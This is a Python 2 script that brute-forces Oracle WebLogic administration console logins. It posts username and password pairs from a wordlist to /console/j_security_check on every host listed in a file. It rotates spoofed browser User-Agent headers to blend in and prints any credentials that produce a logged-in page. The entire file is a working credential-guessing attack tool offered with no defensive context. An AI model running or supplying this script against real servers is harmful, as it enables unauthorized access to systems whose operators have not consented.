#coding=utf-8

import socket
import random
import urllib
import urllib2
import cookielib


agent_pool = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
        'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
        'Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
        'Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999 ',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 ',
        ]


def send(item) :

    cj = cookielib.LWPCookieJar()
    cookie_support = urllib2.HTTPCookieProcessor(cj)
    opener = urllib2.build_opener(cookie_support,urllib2.HTTPHandler)
    urllib2.install_opener(opener)

    '''pool = open('brute.txt')
    for item in pool :
        item = item.split()'''
    
    ips = open('ip.txt')
    for ip in ips :
        ip = 'http://' + ip.strip('\n')
        path = ip + '/console/j_security_check'
        
        username = item[0]
        password = item[1]
        data = {
                'j_username' : username,
                'j_password' : password,
                'j_character_encoding' : 'UTF-8'
                }
        
        i = random.randint(0,7)
        agent = agent_pool[i]
        header = {
                'User-Agent' : agent,
                'Referer' : ip + '/console/login/LoginForm.jsp'
                }

        data = urllib.urlencode(data)
        request = urllib2.Request(path,data,header)
        try :
            response = urllib2.urlopen(request)
            text = str(response.read())
        
            if 'Log Out' in text :
                print ip + u'登陆成功 ' + u' 用户名：' + username + u' 密码：' + password
        except :
            pass
    

def start() :

    pool = open('brute.txt')
    for item in pool :
        item = item.split()
        send(item)

    '''ips = open('ip.txt')
    for ip in ips :
        ip = 'http://' + ip.strip('\n')
        send(ip)'''


def main() :
    
    start()


if __name__ == '__main__' :
    main()
